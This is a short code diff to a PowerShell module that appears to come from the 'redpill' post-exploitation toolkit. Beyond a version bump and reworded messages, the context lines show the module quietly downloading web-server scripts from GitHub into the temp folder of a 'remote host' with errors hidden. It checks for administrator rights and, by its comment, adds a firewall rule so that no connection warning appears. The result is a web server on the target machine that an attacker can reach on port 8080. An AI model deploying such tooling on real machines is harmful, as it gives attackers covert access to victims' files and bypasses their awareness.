@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: none
    Optional Dependencies: BitsTransfer
-   PS cmdlet Dev version: v1.0.1
+   PS cmdlet Dev version: v1.0.2
 
 .NOTES
    Access WebServer: http://<RHOST>:8080/
@@ -64,7 +64,7 @@ If($StartWebServer -ieq "Python" -or $StartWebServer -ieq "Powershell"){
     ## Chose what WebServer to use (Python|Powershell)
     If($StartWebServer -ieq "Python"){## Python http.server sellected as webserver
         If(-not(Test-Path -Path "$Env:TMP\webserver.ps1")){## Make sure auxiliary module exists on remote host
-            Write-Host "[+] Task      : Downloading webserver.ps1 from github" -ForegroundColor Green
+            Write-Host "Downloading webserver.ps1 from github" -ForegroundColor Green
             Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/webserver.ps1 -Destination $Env:TMP\webserver.ps1 -ErrorAction SilentlyContinue|Out-Null   
          }
 
@@ -83,8 +83,8 @@ If($StartWebServer -ieq "Python" -or $StartWebServer -ieq "Powershell"){
         $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544");
         If($IsClientAdmin){## Start-WebServer requires Administrator rigths to run
             If(-not(Test-Path -Path "$Env:TMP\Start-WebServer.ps1")){## Make sure auxiliary module exists on remote host
-                Write-Host "[+] Task      : Downloading Start-WebServer.ps1 from github" -ForegroundColor Green
-                Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Start-Webserver.ps1 -Destination $Env:TMP\Start-WebServer.ps1 -ErrorAction SilentlyContinue|Out-Null
+                Write-Host "Downloading Start-WebServer.ps1 from github" -ForegroundColor Green
+                Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Start-WebServer.ps1 -Destination $Env:TMP\Start-WebServer.ps1 -ErrorAction SilentlyContinue|Out-Null
             }
 
             ## Add firewall rule to prevent connection detected warning msgbox
